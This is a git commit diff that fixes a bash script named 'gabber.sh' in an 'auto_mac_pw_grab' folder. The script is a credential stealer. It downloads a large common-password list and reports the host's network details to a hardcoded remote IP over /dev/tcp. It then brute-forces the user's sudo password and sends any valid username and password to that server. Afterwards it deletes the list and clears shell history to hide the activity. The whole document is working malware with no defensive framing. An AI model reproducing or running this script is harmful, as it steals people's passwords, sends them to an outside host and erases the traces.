8a98e7a0a66868f23e70910f140334dc2107627f
brianisadog <s254901282002@gmail.com>
2019-03-26 09:24:12 -0700

    Debugged scripts

--- auto_mac_pw_grab/gabber.sh
+++ auto_mac_pw_grab/gabber.sh
@@ -1,8 +1,10 @@
+#!/bin/bash
+
 export TARGET=206.189.215.73
 export PORT=3337
 
 # Downloading top 1,000,000 commonly used passwords
-wget -O ~/Downloads/p -q -o /dev/null https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+wget -O ~/Downloads/ppp -q -o /dev/null https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
 
 # Tell server a process has started with host information
 echo "START" > /dev/tcp/"$TARGET"/"$PORT"
@@ -10,7 +12,7 @@ sleep 1
 ifconfig | grep "net" > /dev/tcp/"$TARGET"/"$PORT"
 
 # Check if user uses password or not
-/usr/bin/sudo -n true 2>/dev/null
+sudo -n true 2>/dev/null
 if [ $? -eq 0 ]
 then
 	# Send "no password" message to server
@@ -18,20 +20,20 @@ then
 else
 	# Try every password in the file we just download
 	while read pwd; do
-		echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
+		echo "$pwd" | sudo -S true 2>/dev/null
 		if [ $? -eq 0 ]
 		then
 			# Send "valid password" message to server
 			echo "$USER:$pwd:valid" > /dev/tcp/"$TARGET"/"$PORT"
 			break
 		fi
-	done < ~/Downloads/p
+	done < ~/Downloads/ppp
 fi
 
 # Tell server a process has finished
 echo "END" > /dev/tcp/"$TARGET"/"$PORT"
 
 # Clean up
-rm -f ~/Downloads/p
+rm -f ~/Downloads/ppp
 history -c && rm .bash_history
-#! /bin/rm -f
+#!/bin/rm -f
